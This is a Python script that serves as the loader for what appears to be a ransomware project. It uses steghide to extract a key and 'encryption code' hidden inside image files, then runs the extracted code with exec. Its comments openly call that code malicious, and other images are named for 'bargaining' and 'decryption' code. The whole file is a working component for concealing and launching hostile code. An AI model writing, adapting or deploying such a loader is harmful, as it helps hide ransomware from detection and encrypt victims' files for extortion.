import os
from extract import extract_file


def main():
    # Retrieves malicious code secretly embedded in one of the images
    with open("passphrase.txt", "r") as file:
        lines = file.readlines()
        passphrase = lines[0].strip("\n")

    # Represents the name of the two images to be scanned for
    with open ("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_key: str = lines[0].strip("\n")
        image_containing_encryption_code: str = lines[1].strip("\n")
        image_containing_bargaining_code: str = lines[2].strip("\n")
        image_containing_decryption_code: str = lines[3].strip("\n")

    # Represents whether the 4 images were found or not
    key_found: bool = os.path.exists(image_containing_key)
    encrypt_code_found: bool = os.path.exists(image_containing_encryption_code)
    bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
    decrypt_code_found: bool = os.path.exists(image_containing_decryption_code)
    steghide_found: bool = os.path.exists("steghide-0.5.1-win32\\steghide\\steghide.exe")
    try:
        if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found and steghide_found:
            extract_file(image_containing_key, passphrase)
            code_to_encrypt: str = extract_file(image_containing_encryption_code, passphrase)
            # Runs the malicious script (our "encrypt.py")
            exec("import encrypt")
            exec(f"{code_to_encrypt}")


        else:
            for file in [key_found, encrypt_code_found, bargain_code_found, decrypt_code_found]:
                if file is False:
                    raise FileNotFoundError(f"The image name/path {file} doesn't exist in the current directory."
                                            f"Either the name fed to the variable in the code to be updated, the image"
                                            f"was deleted, or the image specified just doesn't exist.")

    except FileNotFoundError as fnfe:
        print(f"File Not Found: {fnfe}")
        return
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return


main()
